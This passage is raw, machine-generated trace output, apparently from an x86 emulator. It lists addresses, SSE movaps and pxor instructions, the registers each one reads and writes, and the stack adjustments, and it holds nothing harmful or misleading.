[123], regs_write: [125] 0x42ed59: movaps xmmword ptr [ebp - 0x150], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42ed70: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42ed73: pxor xmm5, xmmword ptr [ebp - 0x1a0], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x42ed84: movaps xmmword ptr [ebp - 0x1b0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x42ed8b: movaps xmmword ptr [ebp - 0x140], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42eda7: movaps xmmword ptr [ebp - 0x190], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x42edae: movaps xmm0, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x42edbe: movaps xmmword ptr [ebp - 0x190], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x42edd2: movaps xmmword ptr [ebp - 0x1d0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x42edf1: movaps xmm1, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x42edf8: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42edff: movaps xmmword ptr [ebp - 0x1a0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x42ee06: movaps xmm6, xmmword ptr [ebp - 0x150], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x42ee0d: movaps xmm7, xmmword ptr [ebp - 0x1d0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 0x42ee1c: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ee29: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ee2d: movaps xmmword ptr [ebp - 0x1c0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x42ee3d: movaps xmmword ptr [ebp - 0x150], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42ee44: movaps xmmword ptr [ebp - 0x160], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42ee4b: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x42ee5a: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42ee5e: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x42ee61: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ee65: movaps xmmword ptr [ebp - 0x140], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42ee6c: pxor xmm1, xmmword ptr [ebp - 0x1b0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x42ee74: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42ee7b: movaps xmm5, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x42ee8b: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ee95: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42eeab: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42eeb3: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42eed3: movaps xmmword ptr [ebp - 0x30], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42eef4: movaps xmmword ptr [ebp - 0x40], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42ef14: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ef18: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42ef20: movaps xmm7, xmm4, regs_read: [126], regs_write: [129] 0x42ef23: movaps xmmword ptr [ebp - 0x220], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x42ef3b: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ef3f: movaps xmmword ptr [ebp - 0x180], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x42ef4b: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x42ef56: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42ef5e: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42ef69: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ef76: pxor xmm5, xmmword ptr [ebp - 0x40], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42ef84: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42ef90: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42efb6: movaps xmmword ptr [ebp - 0x170], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x42efe5: movaps xmmword ptr [ebp - 0x140], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42eff4: movaps xmm6, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x42f007: movaps xmm1, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x42f00e: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x42f015: movaps xmmword ptr [ebp - 0x1c0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x42f021: movaps xmm7, xmmword ptr [ebp - 0x140], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x42f028: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f035: pxor xmm6, xmm7, regs_read: [128, 129], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f039: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f046: movaps xmmword ptr [ebp - 0x170], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x42f04d: movaps xmmword ptr [ebp - 0x180], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x42f054: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x42f05c: movaps xmm6, xmm1, regs_read: [123], regs_write: [128] 0x42f063: movaps xmmword ptr [ebp - 0x140], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42f06a: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f06e: movaps xmm3, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x42f075: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f086: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42f089: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f08e: movaps xmm5, xmm1, regs_read: [123], regs_write: [127] 0x42f09f: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f0ab: pxor xmm5, xmm1, regs_read: [127, 123], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f0af: movaps xmm4, xmm2, regs_read: [124], regs_write: [126] 0x42f0cb: movaps xmmword ptr [ebp - 0x30], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f0f0: movaps xmmword ptr [ebp - 0x40], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f0f4: movaps xmmword ptr [ebp - 0x150], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42f118: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f120: movaps xmm1, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x42f127: movaps xmm7, xmm5, regs_read: [127], regs_write: [129] 0x42f13d: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f141: movaps xmmword ptr [ebp - 0x160], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42f14d: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f156: movaps xmmword ptr [ebp - 0x10], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f15a: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x42f169: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f16d: movaps xmmword ptr [ebp - 0x70], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f17a: movaps xmm6, xmm3, regs_read: [125], regs_write: [128] 0x42f17d: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f181: pxor xmm6, xmmword ptr [ebp - 0x40], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42f18f: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f1b8: movaps xmmword ptr [ebp - 0x170], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x42f1bf: movaps xmm0, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x42f1d2: movaps xmmword ptr [ebp - 0x170], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x42f1e9: movaps xmmword ptr [ebp - 0x60], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f201: movaps xmm1, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f205: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42f20c: movaps xmmword ptr [ebp - 0x180], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x42f218: movaps xmm7, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f21c: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f220: pxor xmm7, xmmword ptr [ebp - 0x60], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x42f237: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f23b: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x42f23e: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42f241: movaps xmmword ptr [ebp - 0x10], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f24e: movaps xmmword ptr [ebp - 0x130], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42f255: pxor xmm0, xmm6, regs_read: [122, 128], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f259: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42f25c: movaps xmmword ptr [ebp - 0x20], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f260: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f26e: movaps xmm5, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f272: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f276: movaps xmmword ptr [ebp - 0x70], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f27a: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42f297: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f29f: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f2b6: movaps xmmword ptr [ebp - 0x30], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f2e7: movaps xmmword ptr [ebp - 0xb0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f2ee: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f302: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f30e: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x42f31f: movaps xmmword ptr [ebp - 0x70], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f32a: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f333: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x42f33b: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42f346: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42f349: pxor xmm5, xmmword ptr [ebp - 0xb0], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x42f351: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f36f: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f37b: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f38b: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f3a3: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f3a7: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f3c5: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f3d2: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f3d6: pxor xmm0, xmmword ptr [ebp - 0x10], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f3ec: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f3f5: movaps xmm6, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42f401: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f416: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x42f419: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f421: movaps xmmword ptr [ebp - 0x110], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f428: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f42c: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f430: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f435: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f438: movaps xmm5, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f440: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42f44c: movaps xmmword ptr [ebp - 0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f453: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f45c: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42f45f: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x42f46a: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f48a: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f4c0: movaps xmmword ptr [ebp - 0x20], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f4d2: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f4e4: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f4f9: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f507: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x42f50f: movaps xmmword ptr [ebp - 0x110], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f51b: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f51f: movaps xmmword ptr [ebp - 0xb0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f52f: movaps xmmword ptr [ebp - 0x70], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f533: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42f536: pxor xmm5, xmmword ptr [ebp - 0x20], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42f544: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f558: movaps xmmword ptr [ebp - 0x10], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f55c: movaps xmm0, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f58a: movaps xmmword ptr [ebp - 0x10], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f59a: movaps xmm0, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f59e: pxor xmm0, xmmword ptr [ebp - 0x10], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f5b0: movaps xmm1, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42f5c0: movaps xmmword ptr [ebp - 0x70], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x42f5c4: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f5de: movaps xmmword ptr [ebp - 0x40], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 16 0x42f5e2: pxor xmm0, xmm5, regs_read: [122, 127], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f5e6: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42f5e9: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f5f4: movaps xmmword ptr [ebp - 0x60], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x42f5f8: movaps xmm3, xmmword ptr [ebp - 0x70], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x42f600: movaps xmm4, xmmword ptr [ebp - 0x110], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42f60c: movaps xmmword ptr [ebp - 0xb0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x42f613: pxor xmm1, xmmword ptr [ebp - 0x30], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f618: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f61c: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42f62e: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f637: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x42f640: movaps xmmword ptr [ebp - 0x30], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f644: movaps xmm7, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x42f65e: movaps xmmword ptr [ebp - 0x20], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x42f671: movaps xmm0, xmmword ptr [ebp - 0x30], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 0x42f675: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f68f: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f693: movaps xmmword ptr [ebp - 0x10], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 16 0x42f69c: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x42f6a7: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42f6af: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x42f6b2: pxor xmm5, xmmword ptr [ebp - 0x20], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7fe0 for stack size 0x10000 0x42f6b7: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42f6d2: movaps xmmword ptr [ebp - 0x30], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x42f6db: movaps xmmword ptr [ebp - 0x110], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x42f6ee: movaps xmm2, xmmword ptr [ebp - 0x10], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7ff0 for stack size 0x10000 0x42f6f2: movaps xmmword ptr [ebp - 